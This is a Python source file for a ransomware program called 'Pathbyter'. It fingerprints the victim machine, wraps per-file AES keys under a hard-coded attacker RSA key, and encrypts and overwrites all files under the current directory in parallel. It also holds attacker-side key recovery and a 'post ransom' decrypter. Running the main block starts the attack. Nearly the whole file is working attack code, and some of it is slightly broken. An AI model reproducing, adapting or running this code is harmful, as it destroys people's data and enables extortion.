from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from base64 import b64encode, b64decode
from requests import get
from requests.exceptions import RequestException
from multiprocessing import Pool
from platform import processor, architecture, machine
from platform import system as sys_os
from os import getuid, getlogin, cpu_count, system, walk
from os.path import join, expanduser
from uuid import uuid4
from time import time
import json


### Global Variables ###


IGNORE_FILES = ['pathbyter.py', 
                'ransompaid.pem',
                'private.pem',
                'donotdelete.json',
                'helloworldgenerator.py',
                'oryourdataislost.json', 
                'pathbyter copy.py']

ATKR_PUBLIC_KEY = """MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAxOiq056Sy3TAIfxNB8t+
6oE0hYXFWHh3SMeEOKPZs6uoacGEKZqHPyFlym86BLbUGekL5zVQ0idV4rEAl0cy
JnqeqznvGo2FTOQ8kOQeDYbGBhrfvFTZqVmcL6XsYoO3/SEjmIjgEqPU+7obmS2u
JtQAIHyasB7GJO/yNc3jVTumOLNoVw+J3RUY+bHjDd57aw0aP89mw9v+PeRtVeqp
a2viy/CbL2P3PqoR4nCABe42CPBARD6d37aMbQMyrY8A4avGUmLl03E4KG14VGka
ZnWuDVX26mj8f5ZvKzkqRgysL5FSl+6UgT+lput/HCYmce1M18pVL82/tGvN1lyQ
4S51YR3SX+m8X3qYU+6Lgb7el2vKZKcl4MlvIjWQrjGNPfuCAOg+xIaNusYYK/09
FDAekiSh5UYlrSX8O5cwvPcNyD8vzP139KLDt1deCJNOSDhkQTXtbxq84gsWg8tb
fvyyWexPo5sJrohPqwA/Appvcbs1Eczo54KmrxphzKyWz3tonp6y1JWbmg1CORnP
q1Duf44leIFHdiF+9xXYHA3qsiTrhG7sVOf+gw8eqiL00iNQZDt53rOkA2fMb/jS
6lS4Iiq1BBDly/pLPJz/Z26r3kCCzLGj/WlFE4C0mRwlJyan3vHTeJZhZmsHxKgM
YZHPaQzARCJfJqBlUB+WimMCAwEAAQ=="""


"""Classes"""


# A portable class I made for fetching useful information about a box.
class System:
    def __init__(self):
        self.inet_connection = self.__check_inet_connection()
        self.pub_ip = self.__get_public_ip()
        self.os = sys_os()
        self.user = getlogin()
        self.home_dir = expanduser('~')
        self.cpu = processor()
        self.cores = cpu_count()
        self.machine_arch = architecture()[0]
        self.exec_type = architecture()[1]
        self.machine = machine()


    # Ping Google's DNS server to check for an internet connection
    def __check_inet_connection(self):        
        try:
            google_dns = '8.8.8.8'
            response = system(f'ping -c 1 {google_dns} >/dev/null') #
            if response == 0:
                return True
            else:
                return False
        except:
            return False
        

    # If internet == True, fetch the box's public IP with Ipyify's API
    def __get_public_ip(self):
        api_uri = 'https://api.ipify.org'
        if self.inet_connection == True:
            try:
                ip = get(api_uri, timeout=3)
            except RequestException:
                pass
            return ip.text
        else:
            self.pub_ip = ''
            

    # For debugging: Print the system class objects attributes to the terminal
    def print_attributes(self):
        for attribute, value in self.__dict__.items():
            if value == None:
                pass
            else:
                print(f'{attribute}: {value}')


    # This function recursively crawls a path and returns a list of files.
    def path_crawl(self, path=None, ignore_files=None):
        file_paths = []
        if path == None:    # Set the root path to recursively crawl
            path = './'
        elif path.tolower() == 'user':    # If 'user', recursively crawls os.path.expanduser('~') 
            path = expanduser('~')  
        else:
            path = path

        if ignore_files:
            for root, dirs, files in walk(path):
                for f in files:
                    if f in ignore_files:
                        pass
                    else:
                        f_path = join(root, f)
                        file_paths.append(f_path)
        else:
            for root, dirs, files in walk(path):
                for f in files:
                    f_path = join(root, f)
                    file_paths.append(f_path)

        return file_paths
    

    # Returns a dictionary of information about a box in bytes format.
    def gen_id_card(self):
        _id = uuid4()    # Create a unique id.
        idcard = {'id': str(_id),
                  'pub_ip': self.pub_ip,
                  'os': self.os,
                  'usr': self.user,
                  'machine_arch': self.machine_arch,
                  'exec': self.exec_type,
                  'timestamp': str(time())}
        _idcard = str(idcard).encode()
        
        return _idcard
    

# A simple class to return a program's runtime.
class Runtime:
    def __init__(self):
        self.start_time = time()
        

    def elapsed_time(self):
        print(f'runtime: {time() - self.start_time}\n')


"""Cryptographic Functions"""


# Load an RSA public key, ready for encryption
def load_rsa_key(rsa_pubkey):        
    key = b64decode(rsa_pubkey)
    rsa_key = RSA.import_key(key)

    return rsa_key


# Encrypt a file with an AES CBC cipher
def aescbc_encrypt(rsa_pubkey, data):
    sess_aeskey = get_random_bytes(16)
    rsa_wrapped_aeskey = rsa_wrap_aes(rsa_pubkey, sess_aeskey)

    cipher = AES.new(sess_aeskey, AES.MODE_CBC) 
    cipher_text = cipher.encrypt(pad(data, AES.block_size))
    aes_enc_data = b64encode(cipher_text).decode('utf-8')
    iv = b64encode(cipher.iv).decode('utf-8')

    return rsa_wrapped_aeskey, aes_enc_data, iv


# Decrypt a file with an AES CBC cipher
def aescbc_decrypt(aeskey, iv, enc_data):
        cipher = AES.new(aeskey, AES.MODE_CBC, iv)
        data = unpad(cipher.decrypt(enc_data), AES.block_size)
        
        return data


# Wrap an AES key in RSA encryption
def rsa_wrap_aes(rsa_pubkey, aeskey):
    cipher_rsa = PKCS1_OAEP.new(rsa_pubkey)
    cipher_text = cipher_rsa.encrypt(aeskey)
    enc_aeskey = b64encode(cipher_text).decode('utf-8')
    
    return enc_aeskey


# Unwrap the RSA wrapped AES key
def rsa_unwrap_aes(rsa_privkey, wrapped_aeskey):
    cipher_rsa = PKCS1_OAEP.new(rsa_privkey)
    aeskey = cipher_rsa.decrypt(wrapped_aeskey)
    
    return aeskey


# Use an AES CTR cipher to encrypt a file
def aesctr_encrypt(rsa_pubkey, data):
    new_aeskey = get_random_bytes(16)
    rsa_enc_aes_key = rsa_wrap_aes(rsa_pubkey, new_aeskey)
    
    cipher = AES.new(new_aeskey, AES.MODE_CTR)   
    aes_ct = cipher.encrypt(data)
    nonce = b64encode(cipher.nonce).decode('utf-8')

    return rsa_enc_aes_key, aes_ct, nonce


# Use an AES CTR cipher to decrypt a file
def aesctr_decrypt(aeskey, nonce, enc_data):
    try:
        cipher = AES.new(aeskey, AES.MODE_CTR, nonce=nonce)
        pt = cipher.decrypt(enc_data)
        
        return pt
    
    except (ValueError, KeyError):
        print('ValueError or KeyError')


"""Pathbyter Core Functions"""


# Generate a unique target ID, and create ransomware's key-value database
def init_attack(idcard, rsa_pubkey):
    rsa_wrapped_aeskey, aes_enc_idcard, aescbc_iv = aescbc_encrypt(rsa_pubkey, idcard)
    _idcard = {'id': {'RSA wrapped AES key': rsa_wrapped_aeskey,
                      'AES encrypted id card': aes_enc_idcard, 
                      'AES CBC iv': aescbc_iv}} 
    with open('donotdelete.json', 'w') as f:
        json.dump(_idcard, f)
    with open('oryourdataislost.json', 'w') as f:
        f.write('')
    

# Initialize the local RSA session keys for the ransomware attack
def gen_session_keys(rsa_pubkey):
    keys = RSA.generate(2048)
    sess_privkey = keys.export_key('DER')    # Export the private key in binary format for in-memory AES encryption
    sess_rsa_pubkey = keys.publickey().export_key('DER')
    print(f'[*] Debug\n>> Session RSA private key before encryption:\n{b64encode(sess_privkey)}\n')   # debug: Print session RSA key to match post encryption/decryption
    rsa_wrapped_aeskey, aes_enc_rsa_sess_privkey, aescbc_iv = aescbc_encrypt(rsa_pubkey, sess_privkey)
    stub = {'stub': {'RSA wrapped AES key': rsa_wrapped_aeskey, 
                     'AES encrypted session RSA private key': aes_enc_rsa_sess_privkey,
                     'AES CBC iv': aescbc_iv}}                  
    with open('donotdelete.json', 'r+') as f:
        json_kvdb = json.load(f)
    json_kvdb.update(stub)
    with open('donotdelete.json', 'r+') as f:
        json.dump(json_kvdb, f)
    print(f"[*] Debug:\nKVDB:\n{json.dumps(json_kvdb, indent=4)}")    # debug: Check current values in JSON database 
    
    return sess_rsa_pubkey

    
# This function eworks in conjunction with the multiprocessing.Pool.map(target=function, iterable).
def exec_attack(file_path):
    with open(file_path, 'rb') as f:
        data = f.read()     
    rsa_enc_aeskey, aes_ct, nonce = aesctr_encrypt(sess_pubkey, data)    # Use an AES CTR cipher to encrypt the file
    new_kv_entry = {'file path': file_path, 
                    'RSA wrapped AES key': rsa_enc_aeskey, 
                    'AES CTR nonce': nonce}
    with open('oryourdataislost.json', 'a') as f:
        json.dump(new_kv_entry, f)    # Dump the filepath and the RSA encrypted AES key to decrypt the file to the kvdb
        f.write('\n')
    with open(file_path, 'wb') as f:    # Write the encrypted bytes over the preexisting file.
        f.write(aes_ct)
    print(f'[*] File: {file_path} ~ encrypted in process: {getuid()}')    # debug: Shows that multiprocessing is working
    
    return 0


"""Ransomware C&C Server Side Functions"""


# Decrypt the victims ID and save it to the decryption database.
def decrypt_idcard():
    atkr_privkey = RSA.import_key(open('private.pem').read())
    with open('donotdelete.json', 'r') as f:
        kvdb = json.loads(f.read())
    rsa_enc_aeskey = b64decode(kvdb['id']['RSA wrapped AES key'])
    aes_enc_idcard = b64decode(kvdb['id']['AES encrypted id card'])
    iv = b64decode(kvdb['id']['AES CBC iv'])
    aeskey = rsa_unwrap_aes(atkr_privkey, rsa_enc_aeskey)
    idcard = aescbc_decrypt(aeskey, iv, aes_enc_idcard)
    idcard = idcard.decode()
    return idcard


# Decrypt the session RSA private key and save it to the decryption database.
def decrypt_session_privkey():      
    atkr_privkey = RSA.import_key(open('private.pem').read())
    with open('donotdelete.json', 'r') as f:
        data = json.loads(f.read())
    wrapped_aes_key = b64decode(data['stub']['RSA wrapped AES key'])
    aes_enc_sess_privkey = b64decode(data['stub']['AES encrypted session RSA private key'])
    iv = b64decode(data['stub']['AES CBC iv'])
    aeskey = rsa_unwrap_aes(atkr_privkey, wrapped_aes_key)
    session_rsa_private_key = aescbc_decrypt(aeskey, iv, aes_enc_sess_privkey)
    sess_privkey = RSA.import_key(session_rsa_private_key)
    print(f'[*] Debug\n\>> session RSA private key after decryption:\n{b64encode(session_rsa_private_key)}')  # debug: Ensure session private keys match
    with open('ransompaid.pem', 'wb') as f:
        f.write(sess_privkey.exportKey('PEM'))
    return session_rsa_private_key


"""Post Ransom Decrypter"""


# This would be a standalone program available for download after the ransom was paid
def ctrl_z_ransomware(rsa_privkey):
    sess_privkey = RSA.import_key(rsa_privkey)
    kvdb = []
    with open('oryourdataislost.json', 'r') as f:
        for kv_entry in f.readlines():
            kv_entry = eval(kv_entry)
            kvdb.append(kv_entry)
    print(json.dumps(kvdb, indent=4))
    for _file in kvdb:
        enc_file_path = _file['file path']
        wrapped_aeskey = b64decode(_file['RSA wrapped AES key'])
        nonce = b64decode(_file['AES CTR nonce'])
        aeskey = rsa_unwrap_aes(sess_privkey, wrapped_aeskey)
        with open(enc_file_path, 'rb') as f:
            enc_data = f.read()
            data = aesctr_decrypt(aeskey, nonce, enc_data)
        with open(enc_file_path, 'wb') as f:
            f.write(data)
        print(f'[*] file: {enc_file_path} ~ decrypted')
    

# The Main Ransomware Attack:
runtime = Runtime()
victim_system = System()    # Invoke a System class object
atkr_pubkey = load_rsa_key(ATKR_PUBLIC_KEY)    # Load the hard-coded attacker RSA public key
victim_id = victim_system.gen_id_card()    # Generate a string with a victim UUID and information on the target box.
target_files = victim_system.path_crawl(path=None, ignore_files=IGNORE_FILES)    # Use System.path_crawl() to return a list of target files
print(victim_id)    # debug
init_attack(victim_id, atkr_pubkey)    # Encrypt the id card, create the JSON decryption stub, and JSONL kvdb
sess_rsa_pubkey = gen_session_keys(atkr_pubkey)    # Generate an RSA session key pair, and encrypt the private key in-memory
sess_pubkey = RSA.import_key(sess_rsa_pubkey)    # Import the RSA public key
with Pool(victim_system.cores) as pool:    # Create a process pool relative to the number of logical processors on the target box
    result = pool.map_async(exec_attack, target_files)    # Use the pool.map function to split up the target files among the different processes
    pool.close()
    pool.join()
    print('[*] All target files are encrypted.')
runtime.elapsed_time()    # Print the encryption runtime to the console.

# Server side functions:  
idcard = decrypt_idcard()    # Decrypt the ID card
idcard = eval(idcard)
print(f'[*] Debug:\nKVDB:\n{json.dumps(idcard, indent=4)}')
sess_privkey = decrypt_session_privkey() # Decrypt and save the RSA session private key in PEM format

# Decrypter the victim would download after paying the ransom
ctrl_z_ransomware()    # Iterate through the lines in the JSONL database, decrypting files one at a time
